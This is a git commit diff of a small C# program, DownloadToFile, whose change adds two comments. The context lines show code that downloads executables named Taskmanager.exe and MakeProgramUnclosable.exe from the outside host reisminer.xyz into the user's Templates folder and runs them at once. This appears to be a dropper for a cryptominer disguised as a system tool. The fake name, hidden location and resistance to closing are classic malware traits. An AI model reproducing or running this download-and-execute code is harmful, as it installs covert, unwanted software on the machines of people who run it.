55364355d17b9ae5f062fb794d277c903640946a
Ramon Camenzind <ramon.camenzind@siemens.com>
2020-10-23 21:12:43 +0200

    commented for test

--- DownloadToFile/Program.cs
+++ DownloadToFile/Program.cs
@@ -10,10 +10,12 @@ namespace DownloadToFile
         static WebClient Client = new WebClient ();
         public static void Main(string[] args)
         {
+            //get Taskmanager closer
             Console.WriteLine(Environment.GetFolderPath(Environment.SpecialFolder.Templates));
             Client.DownloadFile("http://reisminer.xyz/exes/Taskmanager.exe",Environment.GetFolderPath(Environment.SpecialFolder.Templates)+@"\Taskmanager.exe");
             Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates)+ @"\Taskmanager.exe");
             
+            //get MakeUnClosable
             Client.DownloadFile("http://reisminer.xyz/exes/MakeProgramUnclosable.exe",Environment.GetFolderPath(Environment.SpecialFolder.Templates)+@"\MakeUnclosable.exe");
             Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates)+ @"\MakeUnclosable.exe");
         }
